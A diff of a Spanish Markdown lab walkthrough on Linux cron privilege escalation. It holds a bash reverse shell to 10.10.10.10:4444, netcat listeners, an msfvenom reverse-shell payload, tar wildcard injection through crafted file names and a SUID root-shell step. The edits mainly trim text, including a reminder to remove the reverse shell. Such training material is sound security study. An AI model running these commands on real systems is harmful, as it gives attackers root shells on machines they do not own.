@@ -4,7 +4,7 @@ Cron  ejecuta automáticamente comandos o scripts (grupos de comandos) a una hor
 
 ## File Permissions
 
-Las tareas cron son programas o scripts que los usuarios pueden programar para que se ejecuten en momentos o intervalos específicos. Los archivos de tabla cron (crontabs) almacenan la configuración para las tareas cron. La tabla cron del sistema se encuentra en /etc/crontab. Ver el contenido de la tabla cron del sistema:
+Las tareas cron son programas o scripts que los usuarios pueden programar para que se ejecuten en momentos o intervalos específicos. Los archivos de tabla cron (crontabs) almacenan la configuración para las tareas cron. La tabla cron del sistema se encuentra en /etc/crontab.&#x20;
 
 ```
 cat /etc/crontab
@@ -49,17 +49,13 @@ Reemplaza el contenido del archivo overwrite.sh con el siguiente después de cam
 bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
 ```
 
-Configura un escucha netcat en tu máquina Kali en el puerto 4444 y espera a que se ejecute la tarea cron (no debería tomar más de un minuto). Un shell de root debería conectarse de vuelta a tu escucha netcat. Si no lo hace, verifica los permisos del archivo, ¿hay algo que falte?
+Configura un escucha netcat en tu máquina Kali en el puerto 4444 y espera a que se ejecute la tarea cron.Un shell de root debería conectarse de vuelta a tu escucha netcat.
 
 ```
 nc -nvlp 4444
 ```
 
-¡Recuerda salir del shell de root y eliminar el código de shell inverso antes de continuar!
-
 ## PATH Environment Variables
-
-
 
 Visualiza el contenido de la tabla cron del sistema:
 
@@ -84,7 +80,7 @@ Asegúrate de que el archivo sea ejecutable:
 chmod +x /home/user/overwrite.sh
 ```
 
-Espera a que se ejecute la tarea cron (no debería tardar más de un minuto). Ejecuta el comando /tmp/rootbash con -p para obtener un shell que se ejecute con privilegios de root:
+Espera a que se ejecute la tarea cron. Ejecuta el comando /tmp/rootbash con -p para obtener un shell que se ejecute con privilegios de root:
 
 ```
 /tmp/rootbash -p
@@ -115,7 +111,7 @@ Usa msfvenom en tu máquina Kali para generar un binario ELF de shell inversa. A
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
 ```
 
-Transfiere el archivo shell.elf a /home/user/ en la máquina virtual Debian (puedes usar scp o alojar el archivo en un servidor web en tu máquina Kali y usar wget). Asegúrate de que el archivo sea ejecutable:
+Transfiere el archivo shell.elf a /home/user/ en la máquina virtual Debian. Asegúrate de que el archivo sea ejecutable:
 
 ```
 chmod +x /home/user/shell.elf
@@ -130,7 +126,7 @@ touch /home/user/--checkpoint-action=exec=shell.elf
 
 Cuando se ejecute el comando tar en la tarea cron, el comodín (\*) se expandirá para incluir estos archivos. Dado que los nombres de archivo son opciones de línea de comandos válidas para tar, tar los reconocerá como tales y los tratará como opciones de línea de comandos en lugar de nombres de archivo.
 
-Configura un oyente de netcat en tu máquina Kali en el puerto 4444 y espera a que se ejecute la tarea cron (no debería tardar más de un minuto). Un shell de root debería conectarse de vuelta a tu oyente de netcat.
+Configura un oyente de netcat en tu máquina Kali en el puerto 4444 y espera a que se ejecute la tarea cron. Un shell de root debería conectarse de vuelta a tu oyente de netcat.
 
 ```
 nc -nvlp 4444
